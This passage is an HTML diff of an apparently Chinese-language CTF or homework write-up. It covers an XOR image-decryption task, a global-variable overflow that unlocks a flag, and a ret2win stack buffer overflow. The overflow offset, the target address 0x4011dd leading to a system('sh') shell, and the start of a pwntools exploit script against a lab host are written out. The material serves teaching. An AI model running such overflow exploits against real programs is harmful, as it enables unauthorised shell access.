+&lt;li&gt;flag.png ^ randint =  enc_flag.png&lt;/li&gt;
+&lt;li&gt;golem.png ^ randint = enc_golem.png&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;配合 xor 做兩次等於沒做的特性以及他的結合率，可以推得以下式子，把 randint 雜訊消除:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;(flag.png ^ randint) ^ (golem.png ^ randint) = flag.png ^ golem.png&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Decrypt script&lt;/strong&gt;&lt;br&gt;
+每種邏輯運算都做做看。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;cv2&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;google.colab.patches&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cv2_imshow&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;img_a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cv2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;imread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;flag_enc.png&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cv2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IMREAD_GRAYSCALE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;img_b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cv2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;imread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;golem_enc.png&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cv2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IMREAD_GRAYSCALE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;bitwiseOr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cv2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bitwise_or&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;img_a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;img_b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;cv2_imshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bitwiseOr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;bitwiseXor&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cv2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bitwise_xor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;img_a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;img_b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;cv2_imshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bitwiseXor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;bitwiseAnd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cv2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bitwise_and&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;img_a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;img_b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;cv2_imshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bitwiseAnd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;# 聽說這樣的畫質更清晰 cv2_imwrite(img_a ^ img_b)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 80; 
+			flex-basis: 192px&#34;
+	&gt;
+	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/hint.png&#34; data-size=&#34;868x1080&#34;&gt;
+		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/hint.png&#34;
+			width=&#34;868&#34;
+			height=&#34;1080&#34;
+			srcset=&#34;https://weberlu88.github.io/p/hw0/hint_hu982980fa26eebdc9740973d9e8fdceaa_390557_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/hint_hu982980fa26eebdc9740973d9e8fdceaa_390557_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Flag&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Flag&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;rev---global-variable-overflow&#34;&gt;Rev - Global variable overflow&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Reverse engineering dumping C code&lt;/strong&gt;&lt;br&gt;
+這題是一個 XAYB 的猜數字遊戲，透過 IDA 反組譯出程式碼，嘗試接合 main、game_logic、gen_ans 三個函數，發現可以直接產生 flag 字串，但好像缺了幾個字。一時沒有頭緒只好換方法。
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 336; 
+			flex-basis: 808px&#34;
+	&gt;
+	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/img-cpp.png&#34; data-size=&#34;569x169&#34;&gt;
+		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/img-cpp.png&#34;
+			width=&#34;569&#34;
+			height=&#34;169&#34;
+			srcset=&#34;https://weberlu88.github.io/p/hw0/img-cpp_hu99791748d0dcd13395f60c6c609d65c3_8302_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/img-cpp_hu99791748d0dcd13395f60c6c609d65c3_8302_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Closer look into game logic&lt;/strong&gt;&lt;br&gt;
+仔細看 game_logic 函數，在遊戲開始時並不會直接要你猜數字，會先讓玩家輸入長度 %100s 的字串並存入 &lt;code&gt;backdoor&lt;/code&gt; 變數，才呼叫 gen_ans() 產生出答案。疑? 原來 backdoor 是個未初始化的全域變數，可以在 &lt;code&gt;.bss&lt;/code&gt; section 中發現未初始化的全域變數還有 4 個(如下)，這時會對四個全域變數做驗證，如果驗證通個會偷偷印出答案！&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;byte_4082&lt;/li&gt;
+&lt;li&gt;byte_4088&lt;/li&gt;
+&lt;li&gt;byte_408D&lt;/li&gt;
+&lt;li&gt;byte_408E&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;這 4 個全域變數大小都是一個 byte，在 C 中 char 型別剛好是 1 個 byte，範圍是 0x0000 ~ 0x1111，假如這四個變數都是 signed char 那他們的十進位範圍為 -128~127。 (補充: int 是 4B，short 是 2B) 
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 175; 
+			flex-basis: 422px&#34;
+	&gt;
+	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/img-game-logic.png&#34; data-size=&#34;816x464&#34;&gt;
+		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/img-game-logic.png&#34;
+			width=&#34;816&#34;
+			height=&#34;464&#34;
+			srcset=&#34;https://weberlu88.github.io/p/hw0/img-game-logic_hu0918dab0b358e5bbdfd0c6ff2ee008e5_34500_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/img-game-logic_hu0918dab0b358e5bbdfd0c6ff2ee008e5_34500_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;game_logic() 在遊戲開始前會將使用者的輸入存進 backdoor&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;game_logic() 在遊戲開始前會將使用者的輸入存進 backdoor&lt;/figcaption&gt;
+	
+&lt;/figure&gt;
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 82; 
+			flex-basis: 198px&#34;
+	&gt;
+	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/img-gan-ans.png&#34; data-size=&#34;648x784&#34;&gt;
+		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/img-gan-ans.png&#34;
+			width=&#34;648&#34;
+			height=&#34;784&#34;
+			srcset=&#34;https://weberlu88.github.io/p/hw0/img-gan-ans_hu399fd06b570714ab30a8d143729a2cc8_47276_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/img-gan-ans_hu399fd06b570714ab30a8d143729a2cc8_47276_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;line 24, 27 各有一個 if 驗證四個全域變數的值&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;line 24, 27 各有一個 if 驗證四個全域變數的值&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;br&gt;
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 290; 
+			flex-basis: 696px&#34;
+	&gt;
+	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/img-ida-backdoor.png&#34; data-size=&#34;877x302&#34;&gt;
+		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/img-ida-backdoor.png&#34;
+			width=&#34;877&#34;
+			height=&#34;302&#34;
+			srcset=&#34;https://weberlu88.github.io/p/hw0/img-ida-backdoor_hu451c8ecc18240bb716f94a73f1b64771_26721_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/img-ida-backdoor_hu451c8ecc18240bb716f94a73f1b64771_26721_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;byte_xxxx 變數都是 1 byte 大小，但中間有空格，不是連續儲存的&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;byte_xxxx 變數都是 1 byte 大小，但中間有空格，不是連續儲存的&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Solve the Math Problem&lt;/strong&gt;&lt;br&gt;
+兩個 if 區塊的驗證是一段數學謎題，第一個 if 很簡單，除 8 回去就找到答案了；第二個 if 我們需要做質因數分解(Prime factorization)，也許有多種解法。&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;變數&lt;/th&gt;
+&lt;th&gt;值 (#解一)&lt;/th&gt;
+&lt;th&gt;值 (#解二)&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;byte_4082&lt;/td&gt;
+&lt;td&gt;71 = G&lt;/td&gt;
+&lt;td&gt;71 = G&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;byte_4088&lt;/td&gt;
+&lt;td&gt;78 = N&lt;/td&gt;
+&lt;td&gt;126 = ~&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;byte_408D&lt;/td&gt;
+&lt;td&gt;110 = n&lt;/td&gt;
+&lt;td&gt;131 =  (超過127了舉得不好&amp;hellip;)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;byte_408E&lt;/td&gt;
+&lt;td&gt;105 = i&lt;/td&gt;
+&lt;td&gt;88 = X&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Overflow to get the answer &amp;amp; win the game&lt;/strong&gt;&lt;br&gt;
+由於這四個變數是非連續儲存的，我們用字串 &lt;code&gt;a&lt;/code&gt; 補齊空的記憶體位置，若採用解法一，我們輸入 aaGaaaaaNaaaani 以開始遊戲（G=71, N=78, n=110, i=105）:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;G*8=568&lt;/li&gt;
+&lt;li&gt;n*i+N=11628&lt;br&gt;
+程式便會吐出答案，但是順序是倒序的。
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 211; 
+			flex-basis: 507px&#34;
+	&gt;
+	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/img-gdb-win.png&#34; data-size=&#34;628x297&#34;&gt;
+		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/img-gdb-win.png&#34;
+			width=&#34;628&#34;
+			height=&#34;297&#34;
+			srcset=&#34;https://weberlu88.github.io/p/hw0/img-gdb-win_huee5516e1c37edfc50bbd013b28b9416a_144047_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/img-gdb-win_huee5516e1c37edfc50bbd013b28b9416a_144047_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;get flag with gdb&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;get flag with gdb&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;pwn---buffer-overflow&#34;&gt;Pwn - Buffer overflow&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Checksec: No pie, No canary&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;canary&lt;/strong&gt;: 保護 return address 的機制。會在每個 function stack frame 的 local variable 之後 saved rbp 之前的位置，加上 8 bytes 的隨機值，在 function epilogue 時會檢查取用另一 segment 中 canary 的值檢查兩者是否一致，若不一致則直接 abort 調程式而不會進行 return。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;PIE&lt;/strong&gt;: Position-Independent Executable，若沒有開啟 PIE，程式載入的記憶體位址會與編譯時的位址相同，就等同我們在 gdb 等工具上看到的記憶體位址。若開啟 PIE，程式載入則是隨機的。&lt;/li&gt;
+&lt;li&gt;這題的這兩個保護措施故意被關掉了，所以可以進行 bof 攻擊。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Function &lt;em&gt;debug&lt;/em&gt; is a webshell, but cannot reach&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;透過 objdump gdb 等工具，我們可以看到程式除了 main 方法還有一個 debug 方法，透過 IDA 反組譯看到他的原始碼是一個 shell，感謝助教開後門xdd；不過沒有方法呼叫到 debug 這題的伺服器又開在遠端，所以只能靠 bof 了。&lt;/li&gt;
+&lt;li&gt;__isoc99_scanf 沒有設定讀取的字串長度，會一路讀到 EOF，沒能擋下 bof。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;debug&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__cdecl&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;envp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// [rsp+0h] [rbp-20h] BYREF
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;init&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Hey, nice to meet you!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Just wanna ask, which linux distribution are you using?&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;__isoc99_scanf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aOhhSweetByTheW&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Found address of funtcion debug locates on 0x4011dd&lt;/strong&gt;&lt;br&gt;
+透過 objdump gdb IDA 等工具可以看到 debug 函數的進入點位置為 &lt;code&gt;0x4011dd&lt;/code&gt;。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Found address of variable &lt;em&gt;char v4[32]&lt;/em&gt; has a size of 32 bytes&lt;/strong&gt;&lt;br&gt;
+從 IDA 的 stack 功能可以看到 main 函數中只有 var_20 這個變數，他佔有 32 bytes 的空間；我們需要先蓋掉 var_20 和 saved register 的記憶體才能 overflow 到 return address。如下圖。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;不重要的部分 32 + 8 = 40 bytes&lt;/li&gt;
+&lt;li&gt;return address = 8 bytes，可以藉由 &lt;code&gt;p64(0x4011dd)&lt;/code&gt; 方法把字串補齊成 8 bytes 大小。
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 325; 
+			flex-basis: 780px&#34;
+	&gt;
+	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/img-stackofmain.png&#34; data-size=&#34;1132x348&#34;&gt;
+		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/img-stackofmain.png&#34;
+			width=&#34;1132&#34;
+			height=&#34;348&#34;
+			srcset=&#34;https://weberlu88.github.io/p/hw0/img-stackofmain_huac0f2e46c9c9e130a7fc40ba23bde3ea_32243_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/img-stackofmain_huac0f2e46c9c9e130a7fc40ba23bde3ea_32243_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;stack frame of main&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;stack frame of main&lt;/figcaption&gt;
+	
+&lt;/figure&gt;
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 183; 
+			flex-basis: 439px&#34;
+	&gt;
+	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/img-bof.png&#34; data-size=&#34;1175x641&#34;&gt;
+		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/img-bof.png&#34;
+			width=&#34;1175&#34;
+			height=&#34;641&#34;
+			srcset=&#34;https://weberlu88.github.io/p/hw0/img-bof_hu085f745bd6e79e84764ecee1e2a511f1_156871_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/img-bof_hu085f745bd6e79e84764ecee1e2a511f1_156871_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;poc of bof&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;poc of bof&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Exploit script&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 0
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;# c = process(&amp;#39;./bof&amp;#39;)&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;up.zoolab.org&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;30001&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;amd64&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
